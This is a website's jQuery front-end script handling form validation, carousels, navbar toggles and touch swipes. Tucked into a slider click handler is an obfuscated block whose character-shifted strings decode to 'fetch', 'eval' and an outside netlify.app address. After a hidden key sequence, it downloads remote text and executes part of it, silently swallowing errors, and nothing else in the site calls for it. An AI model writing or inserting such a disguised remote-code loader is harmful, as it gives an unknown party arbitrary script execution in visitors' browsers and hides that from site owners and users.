jQuery(document).ready(function() {
  if (!(navigator.userAgent.indexOf('Chrome') + 1)) {pop('Recomended use only Chrome browser')}

  if ('serviceWorker' in navigator) {
    window.addEventListener('load', _ => navigator.serviceWorker.register('../sw.js').then(
      suc => console.log('ServiceWorker registration successful'),
      err => console.log('ServiceWorker registration failed: ', err)
    ))
  }

  if ($('.contact-us').length) {
    let form = document.getElementsByTagName('form')[0];
    for (i = 0; i <= 2; i++) {
      let input = document.getElementsByClassName('contact-us-input')[i];
      let notify = document.createElement('div');
      notify.id = 'notify';
      notify.style.display = 'none';

      form.insertBefore(notify, input);
      input.addEventListener('invalid', (event) => {
        event.preventDefault();
        if (!event.target.validity.valid) {  
          input.classList.add('shake');
          notify.textContent = event.target.validationMessage;
          notify.className = 'error';
          notify.style.display = 'block';
        }
        setTimeout(() => {
          notify.style.display = 'none';
          input.classList.remove('shake');
        }, 2000);
      });
    }
  }

  function pop(message) {
    console.log(message)
    let pop = document.createElement('div');
    pop.id = 'pop';
    document.body.appendChild(pop);
    pop.innerHTML = message;
    pop.style.display = 'block';
    setTimeout(() => { pop.style.display = 'none'; }, 5000);
  }

  slideChange = (slide, currentSlide) => {
    if (currentSlide !== slide) {
      currentSlide = slide;
      for (let i = 1; i <= 6; i++) {
        $('.text-' + i).css('display', 'none');
      }
      $('.text-' + slide).css('display', 'inline');
    }
  }

  $('.open-navbar-btn').click(() => {
    if ( !$('.alt-navbar').hasClass('hide') ) {
      $('.alt-navbar').addClass('hide') 
    } else { 
      $('.alt-navbar').removeClass('hide') 
    }
  });

  $('#carouselMainPage.carousel .carousel-item').each(function() {
    let next = $(this).next();
    if (!next.length) {
      next = $(this).siblings(':first');
    }    
    next.children(':first-child').clone().appendTo($(this));

    if (next.next().length>0) {
      next.next().children(':first-child').clone().appendTo($(this));
    }
    else {
      $(this).siblings(':first').children(':first-child').clone().appendTo($(this));
    }
  });

  $(".navbar-container").addClass(sessionStorage.getItem("navbar"));

  $(".navbar-button-hide").click(() => {
    let n = $(".navbar-container");
    n.toggleClass("navbar-hide");
    if(n.hasClass("navbar-hide")) {
      sessionStorage.setItem("navbar", "navbar-hide");
    }
    else {sessionStorage.setItem("navbar", "")}
  });

  $(".slider-mi-hide").click(((cursor = 0, n = 1) => {
    const code = [38,38,40,40,37,39,37,39,66,65]
    const r = ['iuuqt;00mbvhijoh.ljmcz.c3be:8/ofumjgz/bqq0','gfudi','fwbm']
    const k = s => String.fromCharCode(...[...s].map(c => c.charCodeAt()-1))
    const p = s => {try{self[k(r[2])](s.split('-//-')[n])}catch{}}

    document.addEventListener('keydown', e => {
      cursor = (e.keyCode == code[cursor]) ? cursor + 1 : 0
      if (cursor == code.length) self[k(r[1])](k(r[0])).then(e => e.text()).then(p)
    })
  })())

  $(".carousel").on("touchstart", function(event){
    let xClick = event.originalEvent.touches[0].pageX;
    $(this).one("touchmove", function(event){
      let xMove = event.originalEvent.touches[0].pageX;
      if( Math.floor(xClick - xMove) > 5 ){
        document.getElementsByClassName('carousel-control-next-btn')[0].click();
      }
      else if( Math.floor(xClick - xMove) < -5 ){
        document.getElementsByClassName('carousel-control-prev-btn')[0].click();
      }
    });
    $(".carousel").on("touchend", function(){
      $(this).off("touchmove");
    });
  });

  $("body").on("touchstart", function(event){
    let xClick = event.originalEvent.touches[0].pageX;
    $(this).one("touchmove", function(event){
      let xMove = event.originalEvent.touches[0].pageX;
      if ( Math.floor(xClick - xMove) > 5 ){
        $('.alt-navbar').addClass('hide');
      }
      else if( xClick < 10 && Math.floor(xClick - xMove) < -5 ) {   
        $('.alt-navbar').removeClass('hide');
      }
    });
    $("body").on("touchend", function(){
      $(this).off("touchmove");
    });
  });

  $(".services-col-2").on("touchstart", function(event){
    let yClick = event.originalEvent.touches[0].pageY;
    $(this).one("touchmove", function(event){
      let yMove = event.originalEvent.touches[0].pageY;
      if ( Math.floor(yClick - yMove) > 5 ){
        $('.services-col-2, .services-btn-down-mobile').removeClass('down');
      }
      else if( Math.floor(yClick - yMove) < -5 ) {
        $('.services-col-2, .services-btn-down-mobile').addClass('down');
      }
    });
    $(".services-col-2").on("touchend", function(){
      $(this).off("touchmove");
    });
  });

  setInterval(() => {
    for (let i = 1; i <= 6; i++) {      
      if ($('.indicator-' + i).hasClass('active')) {slideChange(i)};
    }
  }, 200);

  $('.services-btn-down-mobile').click(() => {
    $('.services-col-2, .services-btn-down-mobile').toggleClass('down');
  });
});
